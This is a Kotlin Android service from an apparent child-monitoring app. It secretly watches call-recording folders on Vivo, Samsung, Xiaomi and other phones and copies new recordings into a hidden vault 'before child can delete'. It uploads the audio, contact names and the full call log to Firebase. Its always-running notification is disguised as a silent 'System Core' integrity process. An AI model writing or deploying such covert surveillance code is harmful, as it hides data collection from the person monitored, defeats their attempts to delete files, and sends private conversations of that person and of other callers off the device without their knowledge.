package com.vyra.kids.services

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.os.Build
import android.os.FileObserver
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.vyra.kids.core.AppConstants
import com.vyra.kids.core.ContactResolver
import com.vyra.kids.core.FirebaseSyncManager
import com.vyra.kids.core.NetworkSyncManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream

class CallRecordingSyncService : Service() {

    private val fileObservers = mutableListOf<FileObserver>()
    private var callLogObserver: ContentObserver? = null
    private val client = OkHttpClient()

    private val candidatePaths = listOf(
        AppConstants.VIVO_RECORD_CALL_PATH,                  // Vivo / iQOO / Oppo (/storage/emulated/0/Record/Call)
        "/storage/emulated/0/Recordings/Call",              // Samsung
        "/storage/emulated/0/MIUI/sound_recorder/call_rec", // Xiaomi / Redmi / POCO
        "/storage/emulated/0/Call",                         // Stock / Motorola
        "/storage/emulated/0/Recordings"                    // Generic Android
    )

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                AppConstants.SERVICE_NOTIFICATION_ID,
                createSilentNotification(),
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(AppConstants.SERVICE_NOTIFICATION_ID, createSilentNotification())
        }
        startWatchingRecordings()
        setupCallLogObserver()
        syncRecentCallLogs()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createSilentNotification(): Notification {
        val channelId = AppConstants.SERVICE_NOTIFICATION_CHANNEL
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Core",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "System integrity maintenance"
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Core")
            .setContentText("Sync active")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setShowWhen(false)
            .setOngoing(true)
            .build()
    }

    private fun startWatchingRecordings() {
        for (targetPath in candidatePaths) {
            try {
                val recordDir = File(targetPath)
                if (!recordDir.exists()) {
                    recordDir.mkdirs()
                }

                val observer = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    object : FileObserver(recordDir, CLOSE_WRITE or MOVED_TO) {
                        override fun onEvent(event: Int, path: String?) {
                            if (path != null && (event and CLOSE_WRITE != 0 || event and MOVED_TO != 0)) {
                                handleNewRecording(File(recordDir, path))
                            }
                        }
                    }
                } else {
                    @Suppress("DEPRECATION")
                    object : FileObserver(targetPath, CLOSE_WRITE or MOVED_TO) {
                        override fun onEvent(event: Int, path: String?) {
                            if (path != null && (event and CLOSE_WRITE != 0 || event and MOVED_TO != 0)) {
                                handleNewRecording(File(recordDir, path))
                            }
                        }
                    }
                }

                observer.startWatching()
                fileObservers.add(observer)
                Log.i(AppConstants.TAG, "Call Recording Observer started on $targetPath")
            } catch (e: Exception) {
                Log.w(AppConstants.TAG, "Could not watch call recording path: $targetPath", e)
            }
        }
    }

    private fun handleNewRecording(sourceFile: File) {
        if (!sourceFile.exists() || sourceFile.length() == 0L) return
        val ext = sourceFile.extension.lowercase()
        if (ext !in listOf("m4a", "mp3", "aac", "wav", "amr")) return

        Log.i(AppConstants.TAG, "New call recording detected: ${sourceFile.name} (${sourceFile.length()} bytes)")

        // 1. FAST SECRET BACKUP (<50ms): Copy to internal vault immediately before child can delete!
        val vaultDir = File(filesDir, AppConstants.BACKUP_VAULT_FOLDER)
        if (!vaultDir.exists()) vaultDir.mkdirs()

        val vaultFile = File(vaultDir, sourceFile.name)
        try {
            FileInputStream(sourceFile).use { input ->
                FileOutputStream(vaultFile).use { output ->
                    input.copyTo(output)
                }
            }
            Log.i(AppConstants.TAG, "Secured in hidden vault: ${vaultFile.absolutePath}")
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Failed to copy recording to vault", e)
            return
        }

        // 2. Parse phone number and timestamp from Vivo filename format (e.g. 9876543210_20240913101500.m4a)
        val fileName = sourceFile.nameWithoutExtension
        val parts = fileName.split("_")
        val phoneNumber = if (parts.isNotEmpty()) parts[0] else "Unknown"
        val timestamp = System.currentTimeMillis()

        // 3. Attempt immediate upload or queue for offline worker
        uploadOrQueueRecording(vaultFile, phoneNumber, timestamp)
    }

    private fun uploadOrQueueRecording(file: File, phoneNumber: String, timestamp: Long) {
        val syncManager = NetworkSyncManager.getInstance(this)
        val firebaseSync = FirebaseSyncManager.getInstance(this)
        val callId = "call_${timestamp}_${file.nameWithoutExtension}"

        if (!syncManager.isOnline()) {
            Log.i(AppConstants.TAG, "Offline: Queuing recording in vault for sync worker")
            syncManager.scheduleOfflineSyncWorker()
            return
        }

        // 1. Sync to Firebase Cloud (Storage + Firestore)
        val resolved = com.vyra.kids.core.ContactResolver.resolve(this, phoneNumber)
        firebaseSync.syncCallRecord(
            callId = callId,
            contactName = resolved.name,
            phoneNumber = phoneNumber,
            callType = "incoming",
            durationSeconds = (file.length() / (16 * 1024)).coerceAtLeast(10), // approximate duration
            audioFile = file,
            isTamperAttemptDetected = false,
            onComplete = { success: Boolean ->
                if (success) {
                    Log.i(AppConstants.TAG, "Firebase: Uploaded call recording successfully: ${file.name}")
                    // Clean up local vault file after cloud confirmation
                    file.delete()
                } else {
                    Log.w(AppConstants.TAG, "Firebase upload queued/failed, fallback to offline worker")
                    syncManager.scheduleOfflineSyncWorker()
                }
            }
        )
    }

    private fun setupCallLogObserver() {
        try {
            val observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
                override fun onChange(selfChange: Boolean) {
                    super.onChange(selfChange)
                    Log.i(AppConstants.TAG, "CallLog content changed event received -> Triggering syncRecentCallLogs")
                    syncRecentCallLogs()
                }
            }
            contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, observer)
            callLogObserver = observer
            Log.i(AppConstants.TAG, "CallLog ContentObserver registered successfully")
        } catch (e: Exception) {
            Log.w(AppConstants.TAG, "Could not register CallLog observer", e)
        }
    }

    private fun syncRecentCallLogs() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.w(AppConstants.TAG, "READ_CALL_LOG permission not granted yet")
            return
        }

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val cursor = contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    arrayOf(
                        CallLog.Calls._ID,
                        CallLog.Calls.NUMBER,
                        CallLog.Calls.CACHED_NAME,
                        CallLog.Calls.TYPE,
                        CallLog.Calls.DATE,
                        CallLog.Calls.DURATION
                    ),
                    null,
                    null,
                    "${CallLog.Calls.DATE} DESC"
                )

                cursor?.use { c ->
                    val idIdx = c.getColumnIndex(CallLog.Calls._ID)
                    val numIdx = c.getColumnIndex(CallLog.Calls.NUMBER)
                    val nameIdx = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
                    val typeIdx = c.getColumnIndex(CallLog.Calls.TYPE)
                    val dateIdx = c.getColumnIndex(CallLog.Calls.DATE)
                    val durIdx = c.getColumnIndex(CallLog.Calls.DURATION)

                    val firebaseSync = FirebaseSyncManager.getInstance(this@CallRecordingSyncService)

                    while (c.moveToNext()) {
                        val rawNumber = if (numIdx >= 0) c.getString(numIdx) ?: "Unknown" else "Unknown"
                        val cachedName = if (nameIdx >= 0) c.getString(nameIdx) else null
                        val callTypeInt = if (typeIdx >= 0) c.getInt(typeIdx) else CallLog.Calls.INCOMING_TYPE
                        val dateLong = if (dateIdx >= 0) c.getLong(dateIdx) else System.currentTimeMillis()
                        val duration = if (durIdx >= 0) c.getLong(durIdx) else 0L

                        val callType = when (callTypeInt) {
                            CallLog.Calls.INCOMING_TYPE -> "incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                            CallLog.Calls.MISSED_TYPE -> "missed"
                            CallLog.Calls.REJECTED_TYPE -> "rejected"
                            else -> "incoming"
                        }

                        val resolved = ContactResolver.resolve(this@CallRecordingSyncService, rawNumber)
                        val contactName = if (!cachedName.isNullOrBlank()) cachedName else resolved.name

                        val cleanNumber = rawNumber.replace(Regex("[^0-9]"), "")
                        val callId = "call_${dateLong}_$cleanNumber"

                        firebaseSync.syncCallRecord(
                            callId = callId,
                            contactName = contactName,
                            phoneNumber = rawNumber,
                            callType = callType,
                            durationSeconds = duration,
                            audioFile = null,
                            isTamperAttemptDetected = false,
                            callDateMs = dateLong
                        )
                    }
                    Log.i(AppConstants.TAG, "Synced recent CallLog entries successfully")
                }
            } catch (e: Exception) {
                Log.e(AppConstants.TAG, "Error querying CallLog.Calls", e)
            }
        }
    }

    override fun onDestroy() {
        callLogObserver?.let {
            try {
                contentResolver.unregisterContentObserver(it)
            } catch (_: Exception) {}
        }
        callLogObserver = null
        fileObservers.forEach { it.stopWatching() }
        fileObservers.clear()
        super.onDestroy()
    }

    companion object {
        private val RECORDING_PATHS = listOf(
            AppConstants.VIVO_RECORD_CALL_PATH,
            "/storage/emulated/0/Recordings/Call",
            "/storage/emulated/0/MIUI/sound_recorder/call_rec",
            "/storage/emulated/0/Call",
            "/storage/emulated/0/Recordings"
        )

        fun syncCallsAndRecordings(context: Context) {
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    syncRecentCalls(context)
                    scanAndSecureRecordings(context)
                } catch (e: Exception) {
                    Log.e(AppConstants.TAG, "Error in syncCallsAndRecordings", e)
                }
            }
        }

        private fun syncRecentCalls(context: Context) {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                return
            }

            try {
                val cursor = context.contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    arrayOf(
                        CallLog.Calls._ID,
                        CallLog.Calls.NUMBER,
                        CallLog.Calls.CACHED_NAME,
                        CallLog.Calls.TYPE,
                        CallLog.Calls.DATE,
                        CallLog.Calls.DURATION
                    ),
                    null,
                    null,
                    "${CallLog.Calls.DATE} DESC"
                )

                cursor?.use { c ->
                    val numIdx = c.getColumnIndex(CallLog.Calls.NUMBER)
                    val nameIdx = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
                    val typeIdx = c.getColumnIndex(CallLog.Calls.TYPE)
                    val dateIdx = c.getColumnIndex(CallLog.Calls.DATE)
                    val durIdx = c.getColumnIndex(CallLog.Calls.DURATION)

                    val firebaseSync = FirebaseSyncManager.getInstance(context)

                    while (c.moveToNext()) {
                        val rawNumber = if (numIdx >= 0) c.getString(numIdx) ?: "Unknown" else "Unknown"
                        val cachedName = if (nameIdx >= 0) c.getString(nameIdx) else null
                        val callTypeInt = if (typeIdx >= 0) c.getInt(typeIdx) else CallLog.Calls.INCOMING_TYPE
                        val dateLong = if (dateIdx >= 0) c.getLong(dateIdx) else System.currentTimeMillis()
                        val duration = if (durIdx >= 0) c.getLong(durIdx) else 0L

                        val callType = when (callTypeInt) {
                            CallLog.Calls.INCOMING_TYPE -> "incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                            CallLog.Calls.MISSED_TYPE -> "missed"
                            CallLog.Calls.REJECTED_TYPE -> "rejected"
                            else -> "incoming"
                        }

                        val resolved = ContactResolver.resolve(context, rawNumber)
                        val contactName = if (!cachedName.isNullOrBlank()) cachedName else resolved.name
                        val cleanNumber = rawNumber.replace(Regex("[^0-9]"), "")
                        val callId = "call_${dateLong}_$cleanNumber"

                        firebaseSync.syncCallRecord(
                            callId = callId,
                            contactName = contactName,
                            phoneNumber = rawNumber,
                            callType = callType,
                            durationSeconds = duration,
                            audioFile = null,
                            isTamperAttemptDetected = false,
                            callDateMs = dateLong
                        )
                    }
                }
            } catch (e: Exception) {
                Log.e(AppConstants.TAG, "Error in syncRecentCalls", e)
            }
        }

        private fun scanAndSecureRecordings(context: Context) {
            val vaultDir = File(context.filesDir, AppConstants.BACKUP_VAULT_FOLDER)
            if (!vaultDir.exists()) vaultDir.mkdirs()

            val allowedExts = setOf("m4a", "mp3", "aac", "wav", "amr")

            for (path in RECORDING_PATHS) {
                val dir = File(path)
                if (!dir.exists() || !dir.isDirectory) continue
                val files = dir.listFiles() ?: continue
                for (file in files) {
                    if (!file.isFile || file.length() == 0L) continue
                    if (file.extension.lowercase() !in allowedExts) continue

                    val vaultFile = File(vaultDir, file.name)
                    if (!vaultFile.exists()) {
                        try {
                            FileInputStream(file).use { input ->
                                FileOutputStream(vaultFile).use { output ->
                                    input.copyTo(output)
                                }
                            }
                            Log.i(AppConstants.TAG, "Scanned & secured recording in vault: ${file.name}")
                        } catch (e: Exception) {
                            Log.e(AppConstants.TAG, "Failed copying to vault: ${file.name}", e)
                        }
                    }
                }
            }

            // Trigger worker to upload vault recordings
            NetworkSyncManager.getInstance(context).scheduleOfflineSyncWorker()
        }
    }
}
